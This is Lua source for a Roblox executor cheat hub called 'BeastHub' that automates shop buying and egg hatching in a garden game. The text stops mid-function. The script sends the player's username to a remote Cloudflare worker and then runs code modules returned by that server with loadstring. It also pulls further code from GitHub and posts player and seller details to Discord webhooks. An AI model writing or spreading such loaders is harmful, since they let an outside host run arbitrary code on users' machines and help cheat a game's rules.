if not getgenv().BeastHubRayfield then
    getgenv().BeastHubRayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
end

local _BeastHubRayfield = getgenv().BeastHubRayfield
local u2 = 88823002331312
local __bh_isVerified = getgenv()._bh_isVerified
local v4 = 'BeastHub | Exp: ' .. (__bh_isVerified == true and 'lifetime' or (__bh_isVerified and tostring(__bh_isVerified) or 'no value')) .. ' | discord.gg/beasthub'

if getgenv().BeastHubLoaded then
    if _BeastHubRayfield then
        _BeastHubRayfield:Notify({
            Title = 'BeastHub',
            Content = 'Already running! Press H',
            Duration = 5,
            Image = u2,
        })
    else
        warn('BeastHub is already running!')
    end
else
    getgenv().BeastHubLoaded = true
    getgenv().ConfigLoaded = false
    getgenv().BeastHubLink = 'https://raw.githubusercontent.com/bladstaz01/beasthub/refs/heads/main/beasthub.lua'

    if not getgenv().BeastHubFunctions then
        getgenv().BeastHubFunctions = loadstring(game:HttpGet('https://raw.githubusercontent.com/bhubAlt/bhub_alt/refs/heads/main/myFunctions2.lua'))()
    end

    local _BeastHubFunctions = getgenv().BeastHubFunctions
    local v6 = _BeastHubRayfield:CreateWindow({
        Name = v4,
        Icon = u2,
        LoadingTitle = 'BeastHub',
        LoadingSubtitle = 'by Team Forgotten',
        ShowText = 'Rayfield',
        Theme = 'Default',
        ToggleUIKeybind = 'H',
        ConfigurationSaving = {
            Enabled = true,
            FolderName = 'BeastHub',
            FileName = 'userConfig',
        },
    })
    local u7 = true
    local _ = game.Players.LocalPlayer.Name

    local function u11(p8, p9, p10)
        if u7 then
            _BeastHubRayfield:Notify({
                Title = p8,
                Content = p9,
                Duration = p10,
                Image = u2,
            })
        end
    end
    local function u22(p12, p13)
        if typeof(p12) ~= 'string' or p12 == '' then
            warn('[Webhook] Invalid webhook URL')

            return
        else
            local u14 = game:GetService('HttpService'):JSONEncode({content = p13})
            local u15 = syn and syn.request or http_request or request

            if u15 then
                local v17, v18 = pcall(function()
                    local v16 = {
                        Url = p12,
                        Method = 'POST',
                        Headers = {
                            ['Content-Type'] = 'application/json',
                        },
                        Body = u14,
                    }

                    return u15(v16)
                end)

                if not (v17 and v18.Success) then
                    local v19 = warn
                    local v20 = '[Webhook] Failed to send: '
                    local v21 = tostring

                    if v18 then
                        v18 = v18.StatusCode or v18
                    end

                    v19(v20 .. v21(v18))
                end
            else
                warn('[Webhook] Your executor does not support HTTP requests!')
            end
        end
    end
    local function u41(p23, p24, p25, p26, p27, p28)
        local _Players = game:GetService('Players')
        local _HttpService = game:GetService('HttpService')

        if typeof(p23) ~= 'string' or p23 == '' then
            warn('Invalid webhook URL')

            return
        else
            local _LocalPlayer = _Players.LocalPlayer

            if _LocalPlayer then
                local u32 = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. _LocalPlayer.UserId .. '&size=150x150&format=Png&isCircular=true'
                local u33 = syn and syn.request or (http_request or request)

                if u33 then
                    local v34 = nil
                    local v35, v36 = pcall(function()
                        return u33({
                            Url = u32,
                            Method = 'GET',
                        })
                    end)

                    if v35 and v36 and v36.Body then
                        local v37 = _HttpService:JSONDecode(v36.Body)

                        if v37.data[1] and v37.data[1].imageUrl then
                            v34 = v37.data[1].imageUrl
                        else
                            warn('Thumbnail not ready yet, imageUrl is nil')
                        end
                    else
                        warn('Failed to fetch thumbnail from Roblox API')
                    end

                    local v38 = {
                        title = 'BHUB Hatch Monitoring',
                        color = 9511939,
                        timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ'),
                        fields = {
                            {
                                name = 'Player',
                                value = '||' .. _LocalPlayer.Name .. '||',
                                inline = true,
                            },
                            {
                                name = 'Egg',
                                value = 'Name: ' .. p27 .. ' | ' .. p28 .. '\nSpeed: ' .. p26,
                                inline = true,
                            },
                            {
                                name = 'Refunds',
                                value = 'Koi: ' .. tostring(p24) .. '\nSeals: ' .. tostring(p25),
                                inline = true,
                            },
                        },
                    }

                    if v34 then
                        v38.thumbnail = {url = v34}
                    end

                    local u39 = _HttpService:JSONEncode({
                        embeds = {v38},
                    })

                    pcall(function()
                        local v40 = {
                            Url = p23,
                            Method = 'POST',
                            Headers = {
                                ['Content-Type'] = 'application/json',
                            },
                            Body = u39,
                        }

                        u33(v40)
                    end)
                else
                    warn('HTTP request not supported')
                end
            else
                warn('Player not found')

                return
            end
        end
    end
    local function v64(p42, p43, _, p44, p45, p46)
        local _Players2 = game:GetService('Players')
        local _HttpService2 = game:GetService('HttpService')
        local _ReplicatedStorage = game:GetService('ReplicatedStorage')

        if typeof(p42) == 'string' and p42 ~= '' then
            if _Players2.LocalPlayer then
                local v50 = require(_ReplicatedStorage:WaitForChild('Modules'):WaitForChild('GardenGuideModules'):WaitForChild('DataModules'):WaitForChild('PetData'))

                if v50 and v50.Data and v50.Data[p43] then
                    local v51 = v50.Data[p43]
                    local _ImageId = v51.ImageId
                    local v53 = nil

                    if type(_ImageId) ~= 'string' then
                        if type(_ImageId) == 'number' then
                            v53 = tostring(_ImageId)
                        end
                    else
                        v53 = string.match(_ImageId, '%d+')
                    end

                    local v54 = nil

                    if v53 then
                        local u55 = 'https://thumbnails.roblox.com/v1/assets?assetIds=' .. v53 .. '&size=420x420&format=Png&isCircular=false'
                        local u56 = syn and syn.request or http_request or request

                        if u56 then
                            local v57, v58 = pcall(function()
                                return u56({
                                    Url = u55,
                                    Method = 'GET',
                                })
                            end)

                            if v57 and v58 and v58.Body then
                                local v59 = _HttpService2:JSONDecode(v58.Body)

                                if v59 and v59.data and (v59.data[1] and v59.data[1].imageUrl) then
                                    v54 = v59.data[1].imageUrl
                                end
                            end
                        end
                    end

                    local v60 = {
                        title = 'BeastHub Sniper! ' .. (v51.Name or p43),
                        description = v51.Description or 'No description',
                        color = 16744192,
                        timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ'),
                        fields = {
                            {
                                name = 'Rarity',
                                value = tostring(v51.Rarity),
                                inline = true,
                            },
                            {
                                name = 'Base KG',
                                value = tostring(p44),
                                inline = true,
                            },
                            {
                                name = 'Bought Price',
                                value = tostring(p45),
                                inline = true,
                            },
                            {
                                name = 'Seller',
                                value = '||' .. p46 .. '||',
                                inline = true,
                            },
                        },
                    }

                    if v54 then
                        v60.thumbnail = {url = v54}
                    end

                    local u61 = _HttpService2:JSONEncode({
                        content = '@everyone',
                        allowed_mentions = {
                            parse = {
                                'everyone',
                            },
                        },
                        embeds = {v60},
                    })
                    local u62 = syn and syn.request or http_request or request

                    if u62 then
                        pcall(function()
                            local v63 = {
                                Url = p42,
                                Method = 'POST',
                                Headers = {
                                    ['Content-Type'] = 'application/json',
                                },
                                Body = u61,
                            }

                            u62(v63)
                        end)
                    else
                        warn('HTTP not supported')
                    end
                else
                    warn('Pet not found in module')

                    return
                end
            else
                warn('Player not found')

                return
            end
        else
            warn('Invalid webhook URL')

            return
        end
    end

    local v65 = syn and syn.request or (http_request or request)

    if not v65 then
        return warn('HTTP unavailable')
    end

    local _HttpService3 = game:GetService('HttpService')
    local u67 = _HttpService3:UrlEncode(game:GetService('Players').LocalPlayer.Name)
    local u68 = _HttpService3:JSONDecode(v65({
        Url = 'https://super-flower-8386.bladstaz01.workers.dev/?u=' .. u67,
        Method = 'GET',
    }).Body)

    print(u68.u)

    local function u92(p69, p70, p71, p72, p73, p74)
        local _HttpService4 = game:GetService('HttpService')
        local _ReplicatedStorage2 = game:GetService('ReplicatedStorage')
        local v77 = tonumber(p73)
        local v78 = v77 and (string.format('%.2f', v77 * 1.3) or 'N/A') or 'N/A'
        local u79 = syn and syn.request or http_request or request

        if typeof(p69) == 'string' and p69 ~= '' then
            local v80 = require(_ReplicatedStorage2:WaitForChild('Modules'):WaitForChild('GardenGuideModules'):WaitForChild('DataModules'):WaitForChild('PetData'))

            if v80 and v80.Data and v80.Data[p71] then
                local v81 = v80.Data[p71]
                local _ImageId2 = v81.ImageId
                local v83 = nil

                if type(_ImageId2) ~= 'string' then
                    if type(_ImageId2) == 'number' then
                        v83 = tostring(_ImageId2)
                    end
                else
                    v83 = string.match(_ImageId2, '%d+')
                end

                local v84 = nil

                if v83 then
                    local u85 = 'https://thumbnails.roblox.com/v1/assets?assetIds=' .. v83 .. '&size=420x420&format=Png&isCircular=false'

                    if u79 then
                        local v86, v87 = pcall(function()
                            return u79({
                                Url = u85,
                                Method = 'GET',
                            })
                        end)

                        if v86 and v87 and v87.Body then
                            local v88 = _HttpService4:JSONDecode(v87.Body)

                            if v88 and v88.data and (v88.data[1] and v88.data[1].imageUrl) then
                                v84 = v88.data[1].imageUrl
                            end
                        end
                    end
                end

                local v89 = {
                    title = 'BeastHub Huge Hatch! ' .. (v81.Name or p71),
                    description = tostring(p72) .. ' | ' .. tostring(p74),
                    color = 52480,
                    timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ'),
                    fields = {
                        {
                            name = 'Player',
                            value = '||' .. p70 .. '||',
                            inline = true,
                        },
                        {
                            name = 'Rarity',
                            value = tostring(v81.Rarity),
                            inline = true,
                        },
                        {
                            name = 'Base KG',
                            value = tostring(p73) .. ' (' .. v78 .. ' if +30%)',
                            inline = true,
                        },
                    },
                }

                if v84 then
                    v89.thumbnail = {url = v84}
                end

                local u90 = _HttpService4:JSONEncode({
                    content = '@everyone',
                    allowed_mentions = {
                        parse = {
                            'everyone',
                        },
                    },
                    embeds = {v89},
                })

                if u79 then
                    pcall(function()
                        local v91 = {
                            Url = p69,
                            Method = 'POST',
                            Headers = {
                                ['Content-Type'] = 'application/json',
                            },
                            Body = u90,
                        }

                        u79(v91)
                    end)
                else
                    warn('HTTP not supported')
                end
            else
                warn('Pet not found in module')

                return
            end
        else
            warn('Invalid webhook URL')

            return
        end
    end
    local function v96(p93)
        getgenv().BeastHubLoaded = false
        getgenv().BeastHubRayfield = nil

        if _BeastHubRayfield and _BeastHubRayfield.Destroy then
            _BeastHubRayfield:Destroy()
            print('Rayfield destroyed')
        elseif game:GetService('CoreGui'):FindFirstChild('Rayfield') then
            game:GetService('CoreGui').Rayfield:Destroy()
            print('Rayfield destroyed in CoreGui')
        end
        if getgenv().BeastHubLink then
            local v94, v95 = pcall(function()
                loadstring(game:HttpGet(getgenv().BeastHubLink))()
            end)

            if v94 then
                _BeastHubRayfield = getgenv().BeastHubRayfield

                _BeastHubRayfield:Notify({
                    Title = 'BeastHub',
                    Content = p93 .. ' successful',
                    Duration = 3,
                    Image = u2,
                })
                print('BeastHub reloaded successfully')
            else
                warn('Failed to reload BeastHub:', v95)
            end
        else
            warn('Reload link not set!')
        end
    end
    local function v104(p97)
        local _LocalPlayer2 = game.Players.LocalPlayer
        local _Backpack = _LocalPlayer2:WaitForChild('Backpack')
        local v100, v101, v102 = ipairs(_Backpack:GetChildren())

        while true do
            local v103

            v102, v103 = v100(v101, v102)

            if v102 == nil then
                break
            end
            if v103:IsA('Tool') and string.find(v103.Name, p97) then
                _LocalPlayer2.Character.Humanoid:UnequipTools()
                _LocalPlayer2.Character.Humanoid:EquipTool(v103)

                return true
            end
        end

        return false
    end
    local function u113(p105)
        local _LocalPlayer3 = game.Players.LocalPlayer
        local _Backpack2 = _LocalPlayer3:WaitForChild('Backpack')
        local v108, v109, v110 = ipairs(_Backpack2:GetChildren())

        while true do
            local v111

            v110, v111 = v108(v109, v110)

            if v110 == nil then
                break
            end
            if v111:IsA('Tool') then
                local _Name = v111.Name

                if (string.match(_Name, '^(.-)%s+x%d+$') or _Name) == p105 then
                    _LocalPlayer3.Character.Humanoid:EquipTool(v111)

                    return true
                end
            end
        end

        return false
    end

    local _LocalPlayer4 = game.Players.LocalPlayer

    local function u121()
        if not _LocalPlayer4 then
            warn('[BeastHub] Local player not found!')

            return nil
        end

        local _Farm = workspace:WaitForChild('Farm')
        local v116, v117, v118 = pairs(_Farm:GetChildren())

        while true do
            local v119

            v118, v119 = v116(v117, v118)

            if v118 == nil then
                break
            end
            if v119:IsA('Folder') or v119:IsA('Model') then
                local v120 = v119:FindFirstChild('Important') and v119.Important:FindFirstChild('Data')

                if v120 then
                    v120 = v119.Important.Data:FindFirstChild('Owner')
                end
                if v120 and v120.Value == _LocalPlayer4.Name then
                    return v119
                end
            end
        end

        return nil
    end
    local function u124()
        local v122 = u121()

        if not v122 then
            return nil
        end

        local _Spawn_Point = v122:FindFirstChild('Spawn_Point')

        if _Spawn_Point and _Spawn_Point:IsA('BasePart') then
            return _Spawn_Point.CFrame
        end

        warn('[BeastHub] Spawn_Point not found in your farm!')

        return nil
    end

    local u125 = 'Left - spread out'

    local function u128()
        local v126 = nil
        local v127

        if u125 ~= 'Left - spread out' then
            if u125 == 'Right - spread out' then
                v127 = {
                    Vector3.new(10, 0, -18),
                    Vector3.new(19, 0, -18),
                    Vector3.new(28, 0, -18),
                    Vector3.new(37, 0, -18),
                    Vector3.new(10, 0, -33),
                    Vector3.new(19, 0, -33),
                    Vector3.new(28, 0, -33),
                    Vector3.new(37, 0, -33),
                    Vector3.new(10, 0, -48),
                    Vector3.new(19, 0, -48),
                    Vector3.new(28, 0, -48),
                    Vector3.new(37, 0, -48),
                    Vector3.new(10, 0, -63),
                    Vector3.new(19, 0, -63),
                    Vector3.new(28, 0, -63),
                    Vector3.new(37, 0, -63),
                }
            elseif u125 == 'Left - stacked' then
                v127 = {
                    Vector3.new(-30, 0, -12),
                    Vector3.new(-27, 0, -12),
                    Vector3.new(-24, 0, -12),
                    Vector3.new(-21, 0, -12),
                    Vector3.new(-30, 0, -15),
                    Vector3.new(-27, 0, -15),
                    Vector3.new(-24, 0, -15),
                    Vector3.new(-21, 0, -15),
                    Vector3.new(-30, 0, -18),
                    Vector3.new(-27, 0, -18),
                    Vector3.new(-24, 0, -18),
                    Vector3.new(-21, 0, -18),
                    Vector3.new(-30, 0, -21),
                    Vector3.new(-27, 0, -21),
                    Vector3.new(-24, 0, -21),
                    Vector3.new(-21, 0, -21),
                }
            else
                v127 = u125 == 'Right - stacked' and {
                    Vector3.new(16, 0, -12),
                    Vector3.new(19, 0, -12),
                    Vector3.new(22, 0, -12),
                    Vector3.new(25, 0, -12),
                    Vector3.new(16, 0, -15),
                    Vector3.new(19, 0, -15),
                    Vector3.new(22, 0, -15),
                    Vector3.new(25, 0, -15),
                    Vector3.new(16, 0, -18),
                    Vector3.new(19, 0, -18),
                    Vector3.new(22, 0, -18),
                    Vector3.new(25, 0, -18),
                    Vector3.new(16, 0, -21),
                    Vector3.new(19, 0, -21),
                    Vector3.new(22, 0, -21),
                    Vector3.new(25, 0, -21),
                } or v126
            end
        else
            v127 = {
                Vector3.new(-36, 0, -18),
                Vector3.new(-27, 0, -18),
                Vector3.new(-18, 0, -18),
                Vector3.new(-9, 0, -18),
                Vector3.new(-36, 0, -33),
                Vector3.new(-27, 0, -33),
                Vector3.new(-18, 0, -33),
                Vector3.new(-9, 0, -33),
                Vector3.new(-36, 0, -48),
                Vector3.new(-27, 0, -48),
                Vector3.new(-18, 0, -48),
                Vector3.new(-9, 0, -48),
                Vector3.new(-36, 0, -63),
                Vector3.new(-27, 0, -63),
                Vector3.new(-18, 0, -63),
                Vector3.new(-9, 0, -63),
            }
        end

        return v127
    end
    local function u136()
        local v129 = u124()
        local v130 = u128()

        if not v129 then
            return {}
        end

        local v131, v132, v133 = ipairs(v130)
        local v134 = {}

        while true do
            local v135

            v133, v135 = v131(v132, v133)

            if v133 == nil then
                break
            end

            table.insert(v134, v129:PointToWorldSpace(v135))
        end

        return v134
    end

    getgenv().preloadedCustomLoadouts = {}

    local function v151()
        local u137 = 'BeastHub'

        if not isfolder(u137) then
            makefolder(u137)
        end

        local v138 = {}
        local v139 = {}
        local v140, v141 = pcall(function()
            return listfiles(u137)
        end)

        if v140 and type(v141) == 'table' then
            local v142, v143, v144 = ipairs(v141)

            while true do
                local u145

                v144, u145 = v142(v143, v144)

                if v144 == nil then
                    break
                end
                if type(u145) == 'string' and string.match(u145, '%.txt$') then
                    local _txt = u145:match('([^/\\]+)%.txt$')

                    if _txt and _txt ~= '' then
                        v139[#v139 + 1] = _txt

                        local v147, v148 = pcall(function()
                            return readfile(u145)
                        end)

                        v138[_txt] = v147 and v148 and v148 or ''
                    end
                end
            end
        end

        table.sort(v139, function(p149, p150)
            return string.lower(p149) < string.lower(p150)
        end)

        getgenv().preloadedCustomLoadouts = v138
        getgenv().preloadedCustomLoadoutNames = v139
    end

    v151()

    getgenv().preloadCustomLoadouts = v151
    getgenv().LoadoutsChangedEvent = getgenv().LoadoutsChangedEvent or Instance.new('BindableEvent')

    local u152 = loadstring(game:HttpGet('https://raw.githubusercontent.com/bhubAlt/bhub_alt/refs/heads/main/u2.lua'))()
    local _ReplicatedStorage3 = game:GetService('ReplicatedStorage')

    require(_ReplicatedStorage3.Data.PetRegistry)

    local function v162()
        local v154, v155 = pcall(function()
            return require(_ReplicatedStorage3:WaitForChild('Data'):WaitForChild('PetRegistry'))
        end)

        if not v154 or type(v155) ~= 'table' then
            warn('Failed to load PetRegistry module.')

            return {}
        end

        local _PetList = v155.PetList

        if type(_PetList) ~= 'table' then
            warn('PetList not found in PetRegistry.')

            return {}
        end

        local v157, v158, v159 = pairs(_PetList)
        local v160 = {}

        while true do
            local v161

            v159, v161 = v157(v158, v159)

            if v159 == nil then
                break
            end

            table.insert(v160, tostring(v159))
        end

        table.sort(v160)

        return v160
    end

    v162()
    task.wait()
    _BeastHubFunctions.getPetOdds()

    local u163 = _BeastHubFunctions.getPetList()

    table.sort(u163)

    local v172 = (function(p164)
        local _ReplicatedStorage4 = game:GetService('ReplicatedStorage')
        local v166 = tick()
        local v167 = p164 or 5

        while tick() - v166 < v167 do
            local v168, v169 = pcall(function()
                return _ReplicatedStorage4.Modules:WaitForChild('GardenGuideModules'):WaitForChild('DataModules'):WaitForChild('PlantData')
            end)

            if v168 and v169 then
                local v170, v171 = pcall(require, v169)

                if v170 and typeof(v171) == 'table' and typeof(v171.Data) == 'table' then
                    return v171.Data
                end
            end

            task.wait(0.1)
        end

        warn('getAllSeedsTableV2: Failed to get PlantData after timeout, returning empty table')

        return {}
    end)(30)
    local v173 = {}
    local u174, u175

    if v172 then
        local v176, v177, v178 = pairs(v172)

        u174 = u7
        u175 = u125

        while true do
            local v179

            v178, v179 = v176(v177, v178)

            if v178 == nil then
                break
            end

            table.insert(v173, v178)
        end

        table.sort(v173)
    else
        warn('[BeastHub] Failed to load seeds data')

        u174 = u7
        u175 = u125
    end

    local function v188(p180)
        local _LocalPlayer5 = game.Players.LocalPlayer
        local _Backpack3 = _LocalPlayer5:WaitForChild('Backpack')
        local _Humanoid = (_LocalPlayer5.Character or _LocalPlayer5.CharacterAdded:Wait()):WaitForChild('Humanoid')

        _Humanoid:UnequipTools()

        local v184, v185, v186 = ipairs(_Backpack3:GetChildren())

        while true do
            local v187

            v186, v187 = v184(v185, v186)

            if v186 == nil then
                break
            end
            if v187:IsA('Tool') and v187:GetAttribute('c') == p180 then
                _Humanoid:EquipTool(v187)

                return true
            end
        end

        return false
    end

    local u191 = (function()
        local v189 = tick()
        local u190 = nil

        while true do
            pcall(function()
                u190 = loadstring(u68.s.s6)()
            end)

            if u190 then
                break
            end

            task.wait(0.5)

            if tick() - v189 >= 60 then
                return
            end
        end

        return u190
    end)()
    local u194 = (function()
        local v192 = tick()
        local u193 = nil

        while true do
            pcall(function()
                u193 = loadstring(u68.s.s1)()
            end)

            if u193 then
                break
            end

            task.wait(0.5)

            if tick() - v192 >= 60 then
                return
            end
        end

        return u193
    end)()
    local u197 = (function()
        local v195 = tick()
        local u196 = nil

        while true do
            pcall(function()
                u196 = loadstring(u68.s.s3)()
            end)

            if u196 then
                break
            end

            task.wait(0.5)

            if tick() - v195 >= 60 then
                return
            end
        end

        return u196
    end)()
    local v200 = (function()
        local v198 = tick()
        local u199 = nil

        while true do
            pcall(function()
                u199 = loadstring(u68.s.s7)()
            end)

            if u199 then
                break
            end

            task.wait(0.5)

            if tick() - v198 >= 60 then
                return
            end
        end

        return u199
    end)()
    local v203 = (function()
        local v201 = tick()
        local u202 = nil

        while true do
            pcall(function()
                u202 = loadstring(u68.s.s5)()
            end)

            if u202 then
                break
            end

            task.wait(0.5)

            if tick() - v201 >= 60 then
                return
            end
        end

        return u202
    end)()
    local u206 = (function()
        local v204 = tick()
        local u205 = nil

        while true do
            pcall(function()
                u205 = loadstring(u68.s.s8)()
            end)

            if u205 then
                break
            end

            task.wait(0.5)

            if tick() - v204 >= 60 then
                return
            end
        end

        return u205
    end)()
    local v209 = (function()
        local v207 = tick()
        local u208 = nil

        while true do
            pcall(function()
                u208 = loadstring(u68.s.s2)()
            end)

            if u208 then
                break
            end

            task.wait(0.5)

            if tick() - v207 >= 60 then
                return
            end
        end

        return u208
    end)()
    local v212 = (function()
        local v210 = tick()
        local u211 = nil

        while true do
            pcall(function()
                u211 = loadstring(u68.s.s4)()
            end)

            if u211 then
                break
            end

            task.wait(0.5)

            if tick() - v210 >= 60 then
                return
            end
        end

        return u211
    end)()

    u191.init(_BeastHubRayfield, u11, v6, _BeastHubFunctions, v96, u2)

    local _Shops = v6:CreateTab('Shops')

    u194.init(_BeastHubRayfield, u11, v6, _BeastHubFunctions, u2, v104, u113, u121, u124, v162, u22, u163, u191, u68)

    local _Eggs = v6:CreateTab('Eggs')

    u197.init(_BeastHubRayfield, u11, v6, _BeastHubFunctions, u2, v104, u113, u121, u124, v162, u22, v172, v173, v188, u191, u68)
    v200.init(_BeastHubRayfield, u11, v6, _BeastHubFunctions, u2, v104, u113, u121, u124, v162, u22, v172, v173, v188, u191)
    v209.init(_BeastHubRayfield, u11, v6, _BeastHubFunctions, u2, v104, u113, u121, u124, v162, u22, v172, v173, v188, u68)
    v212.init(_BeastHubRayfield, u11, v6, _BeastHubFunctions, u2, v104, u113, u121, u124, v162, u22, v172, v173, v188, u191, u68)
    v203.init(_BeastHubRayfield, u11, v6, _BeastHubFunctions, u2, v104, u113, u121, u124, v162, u22, v172, v173, v188, u68)
    u206.init(_BeastHubRayfield, u11, v6, _BeastHubFunctions, u2, v104, u113, u121, u124, v162, u22, v64, v173)

    local _Misc = v6:CreateTab('Misc')
    local _Workspace = game:GetService('Workspace')
    local _LocalPlayer6 = game:GetService('Players').LocalPlayer
    local _ = game.PlaceId

    _LocalPlayer6.Character:WaitForChild('Humanoid')
    game:GetService('UserInputService')
    game:GetService('RunService')

    local v218 = _BeastHubFunctions.getAvailableShopList(game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild('Seed_Shop'))
    local v219, v220, v221 = ipairs(v218)
    local u222 = {}

    while true do
        local v223

        v221, v223 = v219(v220, v221)

        if v221 == nil then
            break
        end

        table.insert(u222, v223.Name)
    end

    _Shops:CreateSection('Seeds - Tier 1')

    local u224 = {}
    local u233 = _Shops:CreateDropdown({
        Name = 'Select Seeds',
        Options = u222,
        CurrentOption = {},
        MultipleOptions = true,
        Flag = 'dropdownTier1Seeds',
        Callback = function(p225)
            local v226 = typeof(p225) ~= 'table' and {} or p225
            local v227, v228, v229 = ipairs(v226)

            while true do
                local v230

                v229, v230 = v227(v228, v229)

                if v229 == nil then
                    break
                end
                if not table.find(u224, v230) then
                    table.insert(u224, v230)
                end
            end

            for v231 = #u224, 1, -1 do
                local v232 = u224[v231]

                if not table.find(v226, v232) then
                    table.remove(u224, v231)
                end
            end
        end,
    })

    _Shops:CreateButton({
        Name = '[ * ] select all',
        Callback = function()
            local v234, v235, v236 = ipairs(u222)

            while true do
                local v237

                v236, v237 = v234(v235, v236)

                if v236 == nil then
                    break
                end
                if not table.find(u224, v237) then
                    table.insert(u224, v237)
                end
            end

            u233:Set(u222)
        end,
    })
    _Shops:CreateButton({
        Name = '[   ] unselect all',
        Callback = function()
            for v238 = #u224, 1, -1 do
                if table.find(u222, u224[v238]) then
                    table.remove(u224, v238)
                end
            end

            u233:Set({})
        end,
    })

    _BeastHubFunctions._autoBuySelectedSeedsRunning = false
    _BeastHubFunctions._autoBuyAllSeedsRunning = false
    _BeastHubFunctions._autoBuySelectedGearsRunning = false
    _BeastHubFunctions._autoBuyAllGearsRunning = false
    _BeastHubFunctions._autoBuySelectedEggsRunning = false
    _BeastHubFunctions._autoBuyAllEggsRunning = false

    _Shops:CreateToggle({
        Name = 'Auto buy selected',
        CurrentValue = false,
        Flag = 'autoBuySeedsTier1_selected',
        Callback = function(p239)
            _BeastHubFunctions._autoBuySelectedSeedsRunning = p239

            if p239 then
                local v240 = 5

                while 0 < v240 and #u224 <= 0 do
                    task.wait(0.5)

                    v240 = v240 - 0.5
                end

                if #u224 > 0 then
                    _BeastHubFunctions.buyItemsLive(game:GetService('ReplicatedStorage').GameEvents.BuySeedStock, function()
                        return _BeastHubFunctions.getAvailableShopList(game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild('Seed_Shop'))
                    end, u224, function()
                        return _BeastHubFunctions._autoBuySelectedSeedsRunning
                    end, 'BuySeedStock')
                else
                    warn('[BeastHub] No seeds selected!')
                end
            end
        end,
    })
    _Shops:CreateToggle({
        Name = 'Auto buy all',
        CurrentValue = false,
        Flag = 'autoBuySeedsTier1_all',
        Callback = function(p241)
            _BeastHubFunctions._autoBuyAllSeedsRunning = p241

            if p241 then
                _BeastHubFunctions.buyItemsLive(game:GetService('ReplicatedStorage').GameEvents.BuySeedStock, function()
                    return _BeastHubFunctions.getAvailableShopList(game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild('Seed_Shop'))
                end, u222, function()
                    return _BeastHubFunctions._autoBuyAllSeedsRunning
                end, 'BuySeedStock')
            end
        end,
    })
    _Shops:CreateDivider()

    local u242 = _BeastHubFunctions.getAvailableShopList(game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild('Gear_Shop'))
    local v243, v244, v245 = ipairs(u242)
    local u246 = {}

    while true do
        local v247

        v245, v247 = v243(v244, v245)

        if v245 == nil then
            break
        end

        table.insert(u246, v247.Name)
    end

    _Shops:CreateSection('Gears')

    local u248 = {}
    local u256 = _Shops:CreateDropdown({
        Name = 'Select Gears',
        Options = u246,
        CurrentOption = {},
        MultipleOptions = true,
        Flag = 'dropdownGears',
        Callback = function(p249)
            local v250, v251, v252 = ipairs(p249)

            while true do
                local v253

                v252, v253 = v250(v251, v252)

                if v252 == nil then
                    break
                end
                if not table.find(u248, v253) then
                    table.insert(u248, v253)
                end
            end

            for v254 = #u248, 1, -1 do
                local v255 = u248[v254]

                if not table.find(p249, v255) then
                    if table.find(u246, v255) then
                        table.remove(u248, v254)
                    end
                end
            end
        end,
    })

    _Shops:CreateButton({
        Name = '[ * ] select all',
        Callback = function()
            local v257, v258, v259 = ipairs(u246)

            while true do
                local v260

                v259, v260 = v257(v258, v259)

                if v259 == nil then
                    break
                end
                if not table.find(u248, v260) then
                    table.insert(u248, v260)
                end
            end

            u256:Set(u246)
        end,
    })
    _Shops:CreateButton({
        Name = '[   ] unselect all',
        Callback = function()
            for v261 = #u248, 1, -1 do
                if table.find(u246, u248[v261]) then
                    table.remove(u248, v261)
                end
            end

            u256:Set({})
        end,
    })
    _Shops:CreateToggle({
        Name = 'Auto buy selected',
        CurrentValue = false,
        Flag = 'autoBuyGears_selected',
        Callback = function(p262)
            _BeastHubFunctions._autoBuySelectedGearsRunning = p262

            if p262 then
                if #u248 > 0 then
                    _BeastHubFunctions.buyItemsLive(game:GetService('ReplicatedStorage').GameEvents.BuyGearStock, u242, u248, function()
                        return _BeastHubFunctions._autoBuySelectedGearsRunning
                    end)
                else
                    warn('[BeastHub] No gears selected!')
                end
            end
        end,
    })
    _Shops:CreateToggle({
        Name = 'Auto buy all',
        CurrentValue = false,
        Flag = 'autoBuyGears_all',
        Callback = function(p263)
            _BeastHubFunctions._autoBuyAllGearsRunning = p263

            if p263 then
                _BeastHubFunctions.buyItemsLive(game:GetService('ReplicatedStorage').GameEvents.BuyGearStock, u242, u246, function()
                    return _BeastHubFunctions._autoBuyAllGearsRunning
                end)
            end
        end,
    })
    _Shops:CreateDivider()

    local u264 = _BeastHubFunctions.getAvailableShopList(game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild('PetShop_UI'))
    local v265, v266, v267 = ipairs(u264)
    local u268 = {}

    while true do
        local v269

        v267, v269 = v265(v266, v267)

        if v267 == nil then
            break
        end

        table.insert(u268, v269.Name)
    end

    _Shops:CreateSection('Eggs')

    local u270 = {}
    local u278 = _Shops:CreateDropdown({
        Name = 'Select Eggs',
        Options = u268,
        CurrentOption = {},
        MultipleOptions = true,
        Flag = 'dropdownEggs',
        Callback = function(p271)
            local v272, v273, v274 = ipairs(p271)

            while true do
                local v275

                v274, v275 = v272(v273, v274)

                if v274 == nil then
                    break
                end
                if not table.find(u270, v275) then
                    table.insert(u270, v275)
                end
            end

            for v276 = #u270, 1, -1 do
                local v277 = u270[v276]

                if not table.find(p271, v277) then
                    if table.find(u268, v277) then
                        table.remove(u270, v276)
                    end
                end
            end
        end,
    })

    _Shops:CreateButton({
        Name = '[ * ] select all',
        Callback = function()
            local v279, v280, v281 = ipairs(u268)

            while true do
                local v282

                v281, v282 = v279(v280, v281)

                if v281 == nil then
                    break
                end
                if not table.find(u270, v282) then
                    table.insert(u270, v282)
                end
            end

            u278:Set(u268)
        end,
    })
    _Shops:CreateButton({
        Name = '[   ] unselect all',
        Callback = function()
            for v283 = #u270, 1, -1 do
                if table.find(u268, u270[v283]) then
                    table.remove(u270, v283)
                end
            end

            u278:Set({})
        end,
    })

    _BeastHubFunctions._autoBuySelectedEggsRunning = false
    _BeastHubFunctions._autoBuyAllEggsRunning = false

    _Shops:CreateToggle({
        Name = 'Auto buy selected',
        CurrentValue = false,
        Flag = 'autoBuyEggs_selected',
        Callback = function(p284)
            _BeastHubFunctions._autoBuySelectedEggsRunning = p284

            if p284 then
                if #u270 > 0 then
